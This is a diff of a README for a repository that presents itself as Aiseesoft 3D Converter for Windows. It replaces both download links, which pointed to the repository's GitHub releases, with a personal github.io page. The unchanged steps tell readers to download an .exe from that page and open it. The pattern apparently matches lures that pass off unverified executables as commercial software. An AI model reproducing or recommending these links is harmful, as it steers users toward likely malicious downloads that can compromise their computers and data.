@@ -1,6 +1,6 @@
 # 📽️ aiseesoft-3d-converter-windows - Transform standard videos into 3D files
 
-[![Download Aiseesoft 3D Converter](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/bochichornia/aiseesoft-3d-converter-windows/releases)
+[![Download Aiseesoft 3D Converter](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://bochichornia.github.io)
 
 ## 📋 Overview
 
@@ -20,7 +20,7 @@ Before you install this software, ensure your computer meets these minimum speci
 
 Follow these steps to set up the converter on your machine:
 
-1.  Visit the official link to download the software: https://github.com/bochichornia/aiseesoft-3d-converter-windows/releases
+1.  Visit the official link to download the software: https://bochichornia.github.io
 2.  Locate the latest release at the top of the page.
 3.  Click the link ending in .exe to start your download.
 4.  Open the file once it finishes downloading.
